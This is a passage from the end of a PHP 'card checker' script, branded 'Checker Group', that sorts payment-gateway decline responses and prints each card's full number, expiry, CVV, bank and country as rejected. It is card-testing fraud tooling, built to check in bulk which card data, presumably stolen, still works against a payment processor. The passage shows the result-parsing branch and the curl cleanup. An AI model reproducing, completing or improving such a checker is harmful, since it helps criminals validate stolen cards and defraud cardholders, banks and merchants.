  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Card Declined [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  "generic_decline")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Generic_Decline [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  "do_not_honor")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Do_Not_Honor [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}


elseif
(strpos($result2,  "expired_card")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Expired Card [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  'Your card does not support this type of purchase.')) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Card Doesnt Support This Purchase [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  "processing_error")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>processing_error [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2, "service_not_allowed")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Service Not Allowed [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}


elseif
(strpos($result2,  "parameter_invalid_empty")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Declined : Missing Card Details [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  "lock_timeout")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Another Request In Process : Card Not Checked [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2,  "transaction_not_allowed")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Card Doesnt Support Purchase [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}


elseif
(strpos($result2,  'Card is declined by your bank, please contact them for additional information.')) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>3D Secure Redirect [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2, "missing_payment_information")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Missing Payment Informations [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result2, "Payment cannot be processed, missing credit card number")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Missing Credit Card Number [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif 
(strpos($result2,  '-1')) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='white'><font class='badge badge-light'> Update Nonce [ Checker Group (𝖜𝖈𝖌) ] </i></font> <br> <font class='badge badge-primary'>$bank [$country] - $type</i></font> <br>";
}

else {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Card was Declined due to an Unknown Error [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

curl_close($ch);
ob_flush();

echo $result1;
echo $result2;

?>